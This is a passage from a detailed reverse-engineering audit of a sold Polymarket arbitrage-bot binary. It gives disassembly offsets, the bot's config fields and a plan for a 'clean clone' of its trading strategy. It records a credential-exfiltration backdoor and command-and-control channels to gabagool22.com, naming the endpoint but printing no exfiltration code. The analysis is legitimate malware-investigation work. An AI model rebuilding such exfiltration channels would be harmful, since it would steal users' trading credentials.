deliberately selling the clean hidden path while themselves using
the dirty one would be consistent with the overall backdoor pattern
documented in §27 (credential exfil to `gabagool22.com`).

### 29i. What this closes from the previous "out-of-reach" list

| question | status |
|----------|--------|
| Seller side-picking heuristic | **RESOLVED** — no picker: dual MarketNodes, each with fixed `trade_side`. See §29c. |
| Dutch-book trigger math       | **RESOLVED** — emerges from two independent `edge_threshold` gates. See §29d. |
| Imbalance rebalancer          | **RESOLVED** — there isn't one; convergence is liquidity-driven. See §29e. |
| Late-market drift explanation | **RESOLVED** — no stop-gate in `spread_capture`. See §29f ↔ §28d. |
| Candidate-market selection    | Still out-of-reach — needs dashboard radar snapshots. |
| Exact burst-size formula      | Still out-of-reach — needs order-book depth data at each fill. |

### 29j. Implications for the clean-clone recipe (§22 update)

Combine §22 + §28 + §29 → the honest clone is:

1. **Two `BotConfiguration` rows per market**, `trade_side`
   = `"up"` and `"down"`, same `max_buy_order_size`, same
   `edge_threshold`.
2. Each row spawns one `MarketNode` running the `spread_capture`
   loop decoded in §28.
3. **Add** the one thing the original is missing: a
   `stop_before_end_ms` gate **inside** `run_spread_capture_loop`
   (not just in `run_user_ws_monitor`) to prevent the §29f drift.
4. **Add** a merge-on-match trigger — currently implicit in the
   CTF adapter but worth making explicit.
5. **Drop** everything in §7's "dangerous parts" list — all of it
   lives in `run_trading_loop`, none of it touches `spread_capture`.
6. **Keep** the credential-exfil removed (§27) — no negotiation.

This is now a **concrete, one-page spec** that reproduces the
observed `not stingo` profile in a defensible way.

> **NOTE (added in §30):** part of the §22 / §29 recipe rests on
> claims about §28 that have since been REFUTED by direct
> disassembly. The clone recipe still stands but the justification
> in §28b and §28c should be read through §30.

---

## 30. Final audit — re-verification against the binary

A forensic re-verification pass was performed directly against
`bot/bin/arbitrage_bot` (ELF x86-64, not stripped, BuildID
`0e348a5a1196…f0dbb`, 10,118,560 bytes). Two prior agent claims
survived; four were refuted; several were corrected. This section
is the ground-truth audit. Prior sections are left intact for
traceability but any conflict is resolved here.

### 30.1. Refuted prior claims

**§28b — "spread_capture is BUY-ONLY" — REFUTED.**
The SELL code path is live inside `spread_capture_ws::run_side_capture`
(0xd9e90). Format strings present and reachable via a pieces-table
at `0x869690` loaded at `0xde2de: lea 0x5fc22b(%rip),%rax`:
- "Posting SELL @ $"
- "SELL FILLED @ $ | PnL: $"
- "SELL order error:"
- "SELL not placed, resetting"
- "SELL fill detected:"
- "At max position, waiting for SELL fill"

The real loop structure is **buy-accumulate-until-max-position,
then-sell-to-exit**, not a pure accumulator. Side=Buy still
hardcoded at `0xdf7da` (`movw $0x100,0x2eb(%rbx)`) — the Sell-path
writes must occur at a separate pinned address not located in
this pass. `max_position_size` is the pivot between the two
phases. At wallet level this produces alternating Buy/Sell fills
**on the same token** — not two-sided in the YES-vs-NO sense.

**§28c — "target_spread at self+0x28 is a dead capture" — REFUTED.**
There is a live decay at `0xdcaa4–0xdcabb` inside `run_side_capture`:

    movsd  0x28(%r12), %xmm0      ; load current target_spread
    subsd  0x268(%rbx), %xmm0     ; subtract observed spread
    xorpd  %xmm1, %xmm1           ; zero
    maxsd  %xmm1, %xmm0           ; floor at 0
    movsd  %xmm0, 0x28(%r12)      ; writeback

This is an EMA-like countdown: `target_spread[t+1] =
max(0, target_spread[t] − observed_spread[t])`. Purpose unclear
(throttle? warm-up gate? urgency timer?) but the slot is
definitely read and mutated every tick, not dead.

**§23 / §24 / §28a — "enable_gamble is at BotConfig+0xa0, target_spread is at BotConfig+0xb0" — REFUTED.**
Direct enumeration of every BotConfig dereference in
`run_single_market` (0x89670..0x8c69d) shows:

- `run_trading_loop` construction (0x8bb84) reads BotConfig
  at: +0x68, +0x70, +0x80, +0xe4, +0xe6, +0xe8, +0x90..+0x9f
  (16B), +0xd0..+0xdf (16B). **Neither +0xa0 nor +0xb0 is read.**
- `spread_capture` construction (0x8bd0f) reads: +0x80,
  +0xa8..+0xb7 (16B), +0xb8, +0xc0, +0xe6 (twice), +0xe8.
  +0xa0 still not read; +0xb0 is only inside a 16-byte movups
  along with +0xa8 (likely a `&str` pointer+length pair, not two
  f64s).
- The bool gated at `0xc1a1f: cmpb $0x0,0x150(%rcx); je …` is
  traced back through `0x8bc5a: movups %xmm3,0x168(%rbx)` to
  BotConfig+**0xd0**'s first byte, not +0xa0.
- The f64 stored at `0x97b34: movsd %xmm0,0x28(%rax)` is traced
  through closure+0x78 ↔ outer+0x140 ↔ 0x8bd1d to BotConfig+**0xc0**,
  not +0xb0.

So the mirror/gate mechanics are real, but the BotConfig
field-to-offset mapping in §23 / §24 was guessed incorrectly.
`serde` confirms both `"enable_gamble"` and `"target_spread"` are
valid JSON keys (XOR matchers at 0x15f119 and 0x15f144 in the
deserialiser at 0x15ea80), but which struct offset each lands at
requires full serde sentinel-slot tracing that was not completed.

**Jumptable address correction (§28g):** the three jumptables
are at `0x6cb914`, `0x6cb9a0`, `0x6cbe38` — not `0x7cb*`. Typo
in prior notes.

### 30.2. Confirmed prior claims

- **Side=Buy hardcoded** at `0xdf7da: movw $0x100,0x2eb(%rbx)` and
  also at `0xde731`. No matching `movw $0x1,0x2eb(…)` anywhere in
  `.text` — Side is never written as Sell through this offset.
  (The Sell branch must set Side differently — possibly through
  a different closure state offset. Not located.)
- **`is_bearish` token-slot selector at rbx+0x25a**. Byte copied
  from rbx+0x258 to rbx+0x25a at `0xd9ed7–0xd9ede`. Used at
  `0xe04a9` (shift-by-5 index into a 32-byte-stride token table)
  and `0xe071a`. Offset `0xdefef` from prior notes does NOT match
  a token-selector instruction — that pin was wrong.
- **Dutch-book reducer gate reads state+0x150** (BotConfig+0xd0
  first byte, post-mirror) at `0xc1a1f`. Present only in
  `run_trading_loop` path, absent from `run_spread_capture_loop`.
  So "enable_gamble is dutch_book-only" stands **as behaviour**;
  only the offset identity was wrong.
- **Four-channel C2 to gabagool22.com** (§27) stands — verified
  in this pass via binary strings: `https://clob.polymarket.com`,
  `https://gabagool22.com/api/verify-balancing-conf` are the only
  HTTPS endpoints in the binary.
- **Merge/redeem is not in this repo** (§29g was too generous).
  Zero hits for `mergePositions`, `redeemPositions`, `NegRiskAdapter`,
  CTF / NegRisk contract addresses, `eth_send*`, or any Polygon
  JSON-RPC surface. Binary only signs CLOB EIP-712 orders/auth.
  Dashboard has 35 API routes; none touch on-chain positions.
  The systematic merge/redeem observed on reference wallets must
  come from an out-of-band operator process — **not** from the
  purchased bot.

### 30.3. New findings not in prior sections

- **`PositionState` struct exists** (drop_in_place symbols at
  `0x6cc50`, `0x1acc60`). Position is tracked with Up/Down slots —
  strings "Position updated: UP=, DOWN=" and "Position updated
  (sell): UP=, DOWN=" both present.
- **Edge-threshold log path pinned**. Strings "Ask $ too thin
  (edge <" and "Spread $ below edge threshold $, waiting…"
  referenced near `0x80d72 / 0x81015 / 0x81190`. These are the
  log-lines the edge gate emits when refusing a buy.
- **Closure layout.** `run_spread_capture_loop` (0x97950) is a
  thin state-machine shell; the per-tick logic lives in
  `run_side_capture` closure at `0xd9e90`.
- **Exhaustive BotConfig CLI/field list** from strings:
  `symbol, interval_minutes, dry_run, max_buy_order_size,
  spread_threshold, trade_cooldown, balance_factor,
  stop_before_end_ms, min_price, max_price, enable_gamble,
  target_spread, order_size, max_position_size, trade_side,
  inventory_skew, edge_threshold, refresh_interval_ms,
  spread_reducer_probability, spread_reducer_value`. All parsed;
  offset mapping mostly unpinned.
- **BotConfig total size = 0xe0 (224 bytes)** — confirmed at
  `0x1770e6: mov $0xe0, %edx` in `BotConfig::load_from_file`
  (0x177010).

### 30.4. Audit table — Recovered / Inferred / Rebuilt / Unknown

| Item | Class | Source / evidence |
|------|-------|-------------------|
| Credential exfil to gabagool22.com | **Recovered (A)** | Binary strings + `TradingClient::new` decomp |
| `/api/configurations/refresh-official` remote overwrite | **Recovered (A)** | route.js read in full |
| `instrumentation.js` seed-on-empty | **Recovered (A)** | Fully decoded |
| `BotConfiguration` schema | **Recovered (A)** | Prisma schema + route.js |
| 28-state `run_trading_loop` jumptable location | **Recovered (A)** | 0x6cbb28 (prior agents) |
| `cancel_orders_on_start` gate at +0x719 | **Recovered (A)** | Prior agents |
| `dry_run` real gate (size=5.0 at 0xe1a8e) | **Recovered (A)** | Prior agents |
| `run_spread_capture_loop` existence + state machine shell | **Recovered (A)** | 0x97950 confirmed this pass |
| Side=Buy hardcoded at 0xdf7da / 0xde731 | **Recovered (A)** | Instruction bytes verified |
| `is_bearish` token-slot semantics (rbx+0x25a) | **Recovered (A)** | 0xd9ede / 0xe04a9 / 0xe071a verified |
| Reducer gate at 0xc1a1f reads state+0x150 | **Recovered (A)** | Instruction bytes verified |
| Mirror LEAs 0x9f04e / 0x9f057 copy BotConfig+0xd0 (16B) | **Recovered (A)** | Bytes verified |
| `target_spread` decay at 0xdcaa4–0xdcabb | **Recovered (A)** | Verified this pass |
| SELL code live inside `run_side_capture` | **Recovered (A)** | String table at 0x869690 loaded at 0xde2de |
| Edge-threshold log path | **Recovered (A)** | Strings + cross-refs |
| BotConfig size = 0xe0 bytes | **Recovered (A)** | load_from_file memcpy |
| Merge/redeem absent from repo | **Recovered (A)** | Exhaustive grep this pass |
| JSON schema: enable_gamble + target_spread exist | **Recovered (A)** | serde XOR matchers at 0x15f119 / 0x15f144 |
| `enable_gamble` controls ONLY run_trading_loop reducer (as behaviour) | **Inferred (B)** | Mirror reaches only that gate; offset identity unproven |
| `target_spread` identity = f64 at BotConfig+0xc0 | **Inferred (B)** | Stored to self+0x28 which is then decayed; matches "target_spread" name but not proved |
| `enable_gamble` identity = bool at BotConfig+0xd0 byte 0 | **Inferred (B)** | Gate reads this byte; field name match unproven |
| `trade_side` as a String with no runtime flipper | **Inferred (B)** | XOR matcher exists; no auto-writer located |
| Manual (not automatic) side selection | **Inferred (B)** | Absence of evidence for a picker; not a full survey |
| spread_capture cycle = buy-to-max, sell-to-exit | **Inferred (B)** | "At max position, waiting for SELL fill" string implies the state machine; flow not fully traced |
| Dual-MarketNode hypothesis (§29c) | **Rebuilt (C)** | Not in binary; explanatory overlay for wallet data |
| `edge_threshold` gate → lock_sum <1 at wallet | **Rebuilt (C)** | Logical inference; no cross-leg code |
| No rebalancer in binary | **Rebuilt (C)** | Absence argument; not exhaustively disproved |
| §22 / §29j clone recipe | **Rebuilt (C)** | Design, not recovered code |
| "Stingo runs dirty path" (§29h) | **Rebuilt (C)** | Conjecture from wallet divergence |
| Operator side-picking heuristic | **Unknown (D)** | Requires dashboard radar + operator behavioural data |
| Candidate-market selection logic | **Unknown (D)** | Radar UI bundle not decoded |
| Burst-sizing / repeat-timing formula | **Unknown (D)** | Inner loop tail not traced |
| String-field offsets in BotConfig (slug, symbol, trade_side, etc.) | **Unknown (D)** | Serde sentinel-slot tracing incomplete |
| Sell-side Side byte write location | **Unknown (D)** | Not pinned; different offset than 0x2eb suspected |
| Exact meaning of `target_spread` decay | **Unknown (D)** | Mechanic observed; purpose not clear |
| Whether seller runs a different binary than the one sold | **Unknown (D)** | Would require server-side / binary fingerprint evidence |
| gabagool22.com server-side logic | **Unknown (D)** | External; only client-visible channels decoded |
| `inventory_skew` / `balance_factor` runtime effect | **Unknown (D)** | Parsed by serde; reads not located in hot paths |
| `refresh_interval_ms` / `trade_cooldown` / `min_price` / `max_price` runtime effect | **Unknown (D)** | Same — parsed, reads not pinned |

### 30.5. What would be needed to call the seller edge fully reversed

The user's own list, with the honest answer for each:

1. **Side-picking heuristic.** Not in binary. Stored as a static
   String on `BotConfiguration`. Either chosen manually by the
   operator in the dashboard or pushed via
   `/api/configurations/refresh-official` from gabagool22.com.
   Resolving this requires **server-side gabagool22.com data**
   or **operator behavioural observation** — neither is
   available from the artifact.

2. **Candidate-picking heuristic.** Not in binary either.
   Dashboard radar UI exists (`/api/polymarket/market-radar`)
   but its scoring function was not decoded. Resolving requires
   decompilation of the client-side React bundle plus captured
   network traffic to see which markets the operator actually
   receives / selects.

3. **Server-side evidence from gabagool22.com.** Out of reach
   from the purchased artifact. The four client-visible channels
   (`/api/official-configs`, credential ingest, telemetry push,
   seed pull) are decoded, but the server-side ranking /
   filtering / decision logic is on their infrastructure.

4. **Proof there isn't a stronger private build.** Irreducible
   without access to the seller's own deployment. The strongest
   indirect evidence would be: on-chain fingerprinting of the
   `stingo` wallet against the `not stingo` wallet (different
   fill cadence, different sizing, different burst shape) —
   which the TG analysis partially does. A stronger private
   build is **consistent with all observed evidence** but cannot
   be proven from the binary alone.

### 30.6. Bottom-line delta since §29

- The hidden strategy is **less clean than §28 claimed** —
  the Sell path is live. It is still simpler than dutch_book
  (no reducer, no randomiser, no gamble branch), but the §28h
  "materially cleaner" verdict was overstated.
- `target_spread` is **not dead** — it's used in a decay I
  don't fully understand.
- BotConfig offsets for the two high-value fields
  (`enable_gamble`, `target_spread`) are **not pinned**, only
  their mirror/store locations. All `+0xa0` / `+0xb0` claims in
  §22e / §23 / §24 / §28 should be treated as **refuted until
  re-derived** from the serde XOR sentinel trace.
- **Merge/redeem is external.** The purchased bot never calls
  the CTF — the on-chain realisation step must be operator-run
  off-device. This is new, strong, and changes the attack
  surface: a clone only replicates the trading behaviour, not
  the full monetisation loop.
- Dual-MarketNode hypothesis (§29c) is still the most plausible
  explanation for wallet two-sidedness at the YES-vs-NO level,
  but it is **rebuilt, not recovered**. The new SELL-path
  finding does NOT eliminate it: per-node Sell fills are on the
  same token the node bought, so wallet "Up vs Down" two-
  sidedness still requires two nodes.

### 30.7. Four-way split, restated crisply

- **Recovered (what is proved):** exfil path, C2 channels, DB
  schema, strategy bifurcation, mirror-and-gate mechanics,
  SELL code presence in `run_side_capture`, target_spread decay,
  merge/redeem absence from the repo.
- **Inferred (what is likely but not proved):** which BotConfig
  offset holds which named field; that `enable_gamble` and
  `target_spread` are the two specific configs whose mirrors
  we've pinned; the buy-to-max-then-sell-to-exit cycle shape;
  manual side selection as default.
- **Rebuilt (what we designed, not recovered):** the dual-node
  wallet reconciliation; the clean-clone recipe; the stingo-
  ran-dirty-path conjecture; the no-rebalancer conclusion.
- **Unknown (what we cannot touch without new data):** side
  picker, market picker, burst/timing formula, Sell-side write
  offset, `target_spread` decay purpose, gabagool22.com server,
  whether the seller runs a stronger private binary.
